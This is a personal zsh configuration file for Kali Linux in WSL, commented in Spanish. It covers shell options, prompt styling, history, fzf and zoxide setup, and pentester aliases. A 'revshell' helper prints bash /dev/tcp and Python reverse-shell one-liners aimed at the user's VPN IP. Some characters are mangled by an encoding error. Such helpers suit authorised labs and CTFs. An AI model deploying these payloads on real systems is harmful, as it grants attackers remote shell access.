# ~/.zshrc para Kali en WSL 

# --- CONFIGURACIONES B├üSICAS ZSH ---
setopt autocd              # change directory just by typing its name
setopt interactivecomments # allow comments in interactive mode
setopt magicequalsubst     # enable filename expansion for arguments of the form ÔÇÿanything=expressionÔÇÖ
setopt nonomatch           # hide error message if there is no match for the pattern
setopt notify              # report the status of background jobs immediately
setopt numericglobsort     # sort filenames numerically when it makes sense
setopt promptsubst         # enable command substitution in promptsetopt append_history
setopt append_history      # append to history file
setopt auto_pushd          # make cd push old directory onto stack
setopt pushd_ignore_dups   # don't push duplicates
setopt pushd_silent        # don't print directory stack
setopt noclobber           # don't overwrite files with >
setopt rm_star_wait        # wait 10 seconds before rm *
WORDCHARS='_-' 

PROMPT_EOL_MARK=""

# --- KEY BINDINGS ---
bindkey -e
bindkey ' ' magic-space
bindkey '^U' backward-kill-line
bindkey '^[[3;5~' kill-word
bindkey '^[[3~' delete-char
bindkey '^[[1;5C' forward-word
bindkey '^[[1;5D' backward-word
bindkey '^[[5~' beginning-of-buffer-or-history
bindkey '^[[6~' end-of-buffer-or-history
bindkey '^[[H' beginning-of-line
bindkey '^[[F' end-of-line
bindkey '^[[Z' undo
bindkey '^[[A' up-line-or-search
bindkey '^[[B' down-line-or-search
bindkey '^R' history-incremental-search-backward
bindkey '^S' history-incremental-search-forward
bindkey '^A' beginning-of-line
bindkey '^E' end-of-line

# --- AUTOCOMPLETADO ---
autoload -Uz compinit
compinit -d ~/.cache/zcompdump
zstyle ':completion:*:*:*:*:*' menu select
zstyle ':completion:*' auto-description 'specify: %d'
zstyle ':completion:*' completer _expand _complete
zstyle ':completion:*' format 'Completing %d'
zstyle ':completion:*' group-name ''
zstyle ':completion:*' list-colors ''
zstyle ':completion:*' list-prompt %SAt %p: Hit TAB for more, or the character to insert%s
zstyle ':completion:*' matcher-list 'm:{a-zA-Z}={A-Za-z}'
zstyle ':completion:*' rehash true
zstyle ':completion:*' select-prompt %SScrolling active: current selection at %p%s
zstyle ':completion:*' use-compctl false
zstyle ':completion:*' verbose true
zstyle ':completion:*:kill:*' command 'ps -u $USER -o pid,%cpu,tty,cputime,cmd'

# --- HISTORIAL (MODO PRO) ---
HISTFILE=~/.zsh_history
HISTSIZE=50000
SAVEHIST=50000
setopt hist_expire_dups_first
setopt hist_ignore_dups
setopt hist_ignore_space
setopt hist_verify
setopt hist_reduce_blanks
setopt inc_append_history
setopt extended_history
alias history="history 0"

# --- FORMATO DE TIEMPO ---
TIMEFMT=$'\nreal\t%E\nuser\t%U\nsys\t%S\ncpu\t%P'

# --- PROMPT Y COLORES (KALI STYLE) ---
case "$TERM" in
    xterm-color|*-256color) color_prompt=yes;;
esac
force_color_prompt=yes

if [ -n "$force_color_prompt" ]; then
    if [ -x /usr/bin/tput ] && tput setaf 1 >&/dev/null; then
        color_prompt=yes
    else
        color_prompt=
    fi
fi

configure_prompt() {
    prompt_symbol=Òë┐
    case "$PROMPT_ALTERNATIVE" in
        twoline)
            PROMPT=$'%F{%(#.blue.green)}ÔöîÔöÇÔöÇ${debian_chroot:+($debian_chroot)ÔöÇ}${VIRTUAL_ENV:+($(basename $VIRTUAL_ENV))ÔöÇ}(%B%F{%(#.red.blue)}%n'$prompt_symbol$'%m%b%F{%(#.blue.green)})-[%B%F{reset}%(6~.%-1~/ÔÇª/%4~.%5~)%b%F{%(#.blue.green)}]\nÔööÔöÇ%B%(#.%F{red}#.%F{blue}$)%b%F{reset} '
            ;;
        oneline)
            PROMPT=$'${debian_chroot:+($debian_chroot)}${VIRTUAL_ENV:+($(basename $VIRTUAL_ENV))}%B%F{%(#.red.blue)}%n@%m%b%F{reset}:%B%F{%(#.blue.green)}%~%b%F{reset}%(#.#.$) '
            RPROMPT=
            ;;
    esac
}

PROMPT_ALTERNATIVE=twoline
NEWLINE_BEFORE_PROMPT=yes

if [ "$color_prompt" = yes ]; then
    VIRTUAL_ENV_DISABLE_PROMPT=1
    configure_prompt
    # Plugins (Si est├ín instalados)
    [ -f /usr/share/zsh-autosuggestions/zsh-autosuggestions.zsh ] && . /usr/share/zsh-autosuggestions/zsh-autosuggestions.zsh
    [ -f /usr/share/zsh-syntax-highlighting/zsh-syntax-highlighting.zsh ] && . /usr/share/zsh-syntax-highlighting/zsh-syntax-highlighting.zsh
fi
unset color_prompt force_color_prompt

# --- ALIAS B├üSICOS ---
if [ -x /usr/bin/dircolors ]; then
    test -r ~/.dircolors && eval "$(dircolors -b ~/.dircolors)" || eval "$(dircolors -b)"
    alias ls='ls --color=auto'
    alias grep='grep --color=auto'
    alias fgrep='fgrep --color=auto'
    alias egrep='egrep --color=auto'
    alias diff='diff --color=auto'
    alias ip='ip --color=auto'
    zstyle ':completion:*' list-colors "${(s.:.)LS_COLORS}"
fi

alias ll='ls -l'
alias la='ls -A'
alias l='ls -CF'

# --- HERRAMIENTAS MODERNAS ---
# Zoxide
eval "$(zoxide init zsh)"

# Bat (Colorcat)
alias bat='batcat'
export MANPAGER="sh -c 'col -bx | bat -l man -p'"

# FZF PRO
if [ -f /usr/share/doc/fzf/examples/key-bindings.zsh ]; then
    source /usr/share/doc/fzf/examples/key-bindings.zsh
    source /usr/share/doc/fzf/examples/completion.zsh
    export FZF_DEFAULT_OPTS="--height 40% --layout=reverse --border --inline-info --preview 'batcat --color=always --style=numbers --line-range=:500 {}'"
    if command -v fdfind &> /dev/null; then
        export FZF_DEFAULT_COMMAND='fdfind --type f --hidden --follow --exclude .git'
        export FZF_CTRL_T_COMMAND="$FZF_DEFAULT_COMMAND"
        export FZF_ALT_C_COMMAND='fdfind --type d --hidden --follow --exclude .git'
    fi
fi

# --- ­ƒÜÇ INTEGRACI├ôN WINDOWS / WSL (LO NUEVO) ---

# Portapapeles Nativo (Linux -> Windows)
# Uso: cat archivo.txt | clip
alias clip='clip.exe' 

# Abrir explorador de Windows en la carpeta actual de Kali
alias open='explorer.exe .'

# IAs en Windows (Llamadas desde Kali)
alias gemini='gemini.exe'
alias opencode='opencode.exe'
alias ollama='ollama.exe'

# --- ALIAS DE PENTESTER ---
alias update='sudo apt update && sudo apt full-upgrade -y && sudo apt autoremove -y'
# IP (Detecta si es WSL/eth0 o VPN/tun0)
alias myip='ip -br -c a'
alias www='python3 -m http.server 80'
alias ports='netstat -tulanp'
alias cpv='rsync -ah --info=progress2'
alias extract='atool -x'

# --- FUNCIONES ---

# Extraer inteligente
unalias extract 2>/dev/null
function extract() {
    if [ -f "$1" ] ; then
        case "$1" in
            *.tar.bz2)   tar xjf "$1"     ;;
            *.tar.gz)    tar xzf "$1"     ;;
            *.bz2)       bunzip2 "$1"     ;;
            *.rar)       unrar x "$1"     ;;
            *.gz)        gunzip "$1"      ;;
            *.tar)       tar xf "$1"      ;;
            *.tbz2)      tar xjf "$1"     ;;
            *.tgz)       tar xzf "$1"     ;;
            *.zip)       unzip "$1"       ;;
            *.Z)         uncompress "$1"  ;;
            *.7z)        7z x "$1"        ;;
            *)           echo "'$1' no se puede extraer" ;;
        esac
    else
        echo "'$1' no es v├ílido"
    fi
}

mkcd() { mkdir -p "$1" && cd "$1"; }
kp() { ps aux | grep $1 | grep -v grep | awk '{print $2}' | xargs sudo kill -9; }
genpass() { LC_ALL=C tr -dc 'A-Za-z0-9!@#$%^&*' < /dev/urandom | head -c ${1:-16}; echo; }
vpnip() { ip -4 addr show tun0 | grep -oP "(?<=inet\s)\d+(\.\d+){3}"; }

# Reverse shell r├ípida
revshell() {
    local ip=${1:-$(ip -4 addr show tun0 2>/dev/null | grep -oP '(?<=inet\s)\d+(\.\d+){3}' || echo "IP_NO_ENCONTRADA")}
    local port=${2:-443}
    echo "--- Bash ---"
    echo "bash -i >& /dev/tcp/$ip/$port 0>&1"
    echo "--- Python ---"
    echo "python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$ip\",$port));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"/bin/bash\")'"
}

# --- DEPENDENCIAS OPCIONALES ---
# Si usas scripts externos
[ -f ~/.config/zsh/scripts/ctf_utils.zsh ] && source ~/.config/zsh/scripts/ctf_utils.zsh
